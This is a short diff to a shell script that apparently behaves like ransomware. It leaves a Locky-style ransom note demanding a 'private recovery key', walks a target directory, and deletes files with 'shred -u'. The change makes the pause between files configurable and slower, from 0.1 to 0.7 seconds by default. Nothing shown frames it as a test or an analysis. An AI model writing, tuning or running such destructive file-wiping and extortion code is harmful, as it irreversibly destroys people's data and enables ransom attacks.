@@ -42,6 +42,8 @@ Do not modify or delete files with the .locky extension.
 To restore access to your data, you need a private recovery key.
 EOF
 
+DELAY_SECONDS="${DELAY_SECONDS:-0.7}"
+
 find "${TARGET_DIR}" \
   -xdev \
   -type f \
@@ -67,5 +69,5 @@ while IFS= read -r -d '' file; do
     shred -u -n 1 -- "${file}"
   fi
 
-  sleep 0.1
+  sleep "${DELAY_SECONDS}"
 done
